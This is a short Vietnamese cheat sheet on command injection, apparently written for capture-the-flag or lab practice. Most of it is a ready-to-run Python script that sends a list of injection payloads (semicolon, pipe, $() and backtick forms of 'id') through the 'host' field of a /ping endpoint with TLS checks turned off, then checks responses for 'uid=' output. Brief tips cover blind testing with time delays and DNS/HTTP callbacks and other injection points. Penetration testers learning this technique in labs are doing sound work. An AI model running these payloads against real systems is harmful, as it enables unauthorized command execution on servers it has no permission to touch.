# Command Injection

## Snippet copy-là-chạy

```python
import requests

base = "http://target"
s = requests.Session()
s.verify = False

payloads = ["; id", "| id", "$(id)", "`id`"]
for p in payloads:
    r = s.post(f"{base}/ping", data={"host": f"127.0.0.1{p}"}, timeout=5)
    text = r.text.lower()
    if "uid=" in text or "gid=" in text:
        print("HIT", p)
        print(r.text[:300])
        break
    print(p, r.status_code, len(r.text))
```

## Lưu ý nhanh
- Kiểm tra cả blind: time delay, DNS/HTTP callback (nếu môi trường cho phép).
- Chỗ inject có thể là form, JSON, query, header; giữ đúng Content-Type.
- Tránh payload phá service; mục tiêu là xác nhận và lấy flag/bằng chứng tối thiểu.